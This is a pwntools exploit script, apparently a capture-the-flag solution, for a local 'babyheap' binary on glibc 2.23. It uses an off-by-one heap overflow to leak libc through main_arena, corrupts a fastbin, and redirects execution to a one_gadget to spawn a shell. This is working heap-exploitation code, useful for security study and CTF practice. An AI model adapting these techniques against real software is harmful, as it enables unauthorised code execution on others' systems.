from pwn import *

context.log_level = 'debug'

sh = process('./babyheap')
elf = ELF('./babyheap')
libc = ELF('./lib/x86_64-linux-gnu/libc-2.23.so')

def allocate(size):
	sh.sendlineafter('Command: ','1')
	sh.sendlineafter('Size: ',str(size))

def resize(idx,size,con):
        sh.sendlineafter('Command: ','2')
        sh.sendlineafter('Index: ',str(idx))
        sh.sendlineafter('Size: ',str(size))
	sh.sendlineafter('Content: ',con)
def delete(idx):
        sh.sendlineafter('Command: ','3')
        sh.sendlineafter('Index: ',str(idx))

def show(idx):
	sh.sendlineafter('Command: ','4')
        sh.sendlineafter('Index: ',str(idx))




allocate(0x18) #0
allocate(0x28) #1
allocate(0x58) #2
allocate(0x18) #3
allocate(0x38) #4

#---------leak libc addr-------------------------
resize(0,0x19,'a'*0x18+p8(0x91))
delete(1)
allocate(0x28)
show(2)
sh.recvuntil(': ')
leak_addr = u64(sh.recv(8))
print 'leak_addr: '+hex(leak_addr)
main_arena = leak_addr- 88
print 'main_arena: '+hex(main_arena)
libc_addr = main_arena - 0x3c4b20
print 'libc_base: '+hex(libc_addr)
one_gadget = libc_addr + 0x4526a 
#gdb.attach(sh)
#----------get shell-----------------------------
allocate(0x58) #5
delete(5)
resize(2,0x8,p64(0x41))
allocate(0x58) #5

#gdb.attach(sh)
#allocate(0x18) #6
#allocate(0x58) #7

resize(5,0x59,'a'*0x58+p8(0x61))
#resize(4,0x10,'a'*0x38+p64(0x41))
delete(3)
allocate(0x58)
resize(3,0x20,'a'*0x18+p64(0x41))
delete(4)
#gdb.attach(sh)
resize(3,0x28,'c'*0x18+p64(0x41)+p64(main_arena+0x20))
#gdb.attach(sh)
allocate(0x38)
#gdb.attach(sh)
allocate(0x38)

resize(6,0x30,'a'*0x28+p64(main_arena-0x20))
allocate(0x10)
resize(7,0x8,p64(one_gadget))
allocate(0x10)
sh.interactive()


